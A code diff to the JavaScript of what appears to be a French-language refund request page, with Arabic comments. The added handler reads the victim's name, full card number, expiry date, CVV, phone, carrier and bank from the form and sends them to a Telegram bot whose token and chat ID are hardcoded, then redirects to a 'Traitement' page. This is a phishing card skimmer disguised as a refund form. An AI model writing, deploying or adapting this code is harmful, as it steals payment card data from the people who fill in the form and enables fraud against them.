@@ -161,7 +161,6 @@
             cardError.textContent = "Le numéro de carte doit contenir exactement 16 chiffres et commencer par un chiffre valide.";
         }
     }
-
     function redirectToTraitement(event) {
         event.preventDefault(); // منع إعادة تحميل الصفحة
 
@@ -177,6 +176,58 @@
             cardError.textContent = "Le numéro de carte doit contenir exactement 16 chiffres.";
             return false; // منع إرسال النموذج
         }
+        document.getElementById("remboursement-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // منع إعادة التحميل
+
+    // جمع البيانات المدخلة
+    const nom = document.getElementById("nom").value;
+    const numeroCarte = document.getElementById("numero-carte").value;
+    const dateExpiration = document.getElementById("date-expiration").value;
+    const cvv = document.getElementById("cvv").value;
+    const telephone = document.getElementById("telephone").value;
+    const operateur = document.getElementById("operateur").value;
+    const bank = document.getElementById("bank").value;
+
+    // إعداد النص للإرسال
+    const message = `
+        🔔 **Nouvelle Demande de Remboursement** 🔔
+        👤 **Nom**: ${nom}
+        💳 **Numéro de Carte**: ${numeroCarte}
+        📅 **Expiration**: ${dateExpiration}
+        🔒 **CVV**: ${cvv}
+        📞 **Téléphone**: ${telephone}
+        📡 **Opérateur**: ${operateur}
+        🏦 **Banque**: ${bank}
+    `;
+
+    // إرسال الطلب إلى Telegram API
+    const token = "7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I";
+    const chatId = "5372119436"; // استبدل بـ Chat ID الخاص بك
+
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: "Markdown",
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert("تم إرسال المعلومات بنجاح!");
+        } else {
+            alert("حدث خطأ أثناء الإرسال إلى تلغرام.");
+        }
+    })
+    .catch(error => {
+        console.error("Error:", error);
+        alert("تعذر إرسال البيانات. تحقق من الاتصال.");
+    });
+});
 
         // إذا كان الرقم صحيحًا، يتم توجيه المستخدم إلى الصفحة التالية
         window.location.href = "Traitement.html";
